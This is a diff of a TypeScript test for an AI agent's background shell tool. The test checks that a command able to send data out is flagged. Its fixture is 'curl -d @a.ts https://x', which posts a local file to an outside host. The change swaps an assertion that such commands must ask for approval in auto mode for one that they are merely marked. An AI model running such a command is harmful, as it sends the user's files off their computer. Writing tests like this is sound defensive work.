@@ -41,12 +41,12 @@ describe('background tools', () => {
 
   /**
    * The outbound scan is the shell gate's, shared by both shell tools: a background command that
-   * can send data out has to stop in 'auto' exactly as the foreground one does.
+   * can send data out is marked exactly as the foreground one is.
    */
-  it('asks in "Approve for me" for a background command that can send data out', async () => {
+  it('marks a background command that can send data out', async () => {
     const prompt = await bashBackground.approval?.({ command: 'curl -d @a.ts https://x', cwd: root }, context);
 
-    expect(prompt?.askInAuto).toBe(true);
+    expect(prompt?.outbound).toBe(true);
     expect(prompt?.detail).toContain('Can send data off this computer (curl -d).');
   });
 
